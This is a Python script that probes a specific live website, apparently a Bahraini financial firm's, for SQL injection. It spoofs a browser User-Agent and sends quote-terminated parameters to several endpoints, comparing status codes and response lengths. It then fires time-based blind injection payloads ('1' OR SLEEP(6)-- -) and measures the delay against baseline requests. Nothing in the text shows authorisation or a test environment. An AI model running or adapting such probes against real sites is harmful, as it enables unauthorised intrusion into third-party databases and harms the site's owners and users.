import urllib.request, time, urllib.parse
BASE="https://www.infinitycapital.bh"
def get(u,hdrs=None):
    h={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36","Accept-Encoding":"identity"}
    if hdrs:h.update(hdrs)
    try:
        r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=30)
        return r.status, r.read()
    except Exception as e:
        return getattr(e,'code',0), b''
cases=[
 ("home-zzz-quote", "/?zzz=1%27"),
 ("home-zzz-plain", "/?zzz=1"),
 ("contact-q-quote", "/contact?cb=1&q=1%27"),
 ("contact-plain", "/contact?cb=1&q=test"),
 ("contact-x-quote", "/contact?cb=1&q=test&x=1%27"),
 ("404-q-quote", "/404?q=1%27"),
 ("api-id-quote", "/api/?id=1%27&page=2"),
 ("api-plain", "/api/?id=1&page=2"),
]
for name,p in cases:
    st,b=get(BASE+p); n=len(b)
    print(f"{name}: status={st} len={n}")
# time-based probes
tb=urllib.parse.quote("1' OR SLEEP(6)-- -")
for name,p in [("zzz", "/?zzz="),("contact-q","/contact?cb=1&q="),("contact-x","/contact?cb=1&q=t&x="),("api-id","/api/?id=&page=2")]:
    t0=time.time(); s,_=get(BASE+p+tb); dt=time.time()-t0
    t1=time.time(); s2,b2=get(BASE+p+"1"); dt2=time.time()-t1
    print(f"TIME {name}: sleep={dt:.2f}s (status {s}) vs baseline={dt2:.2f}s len={len(b2)}")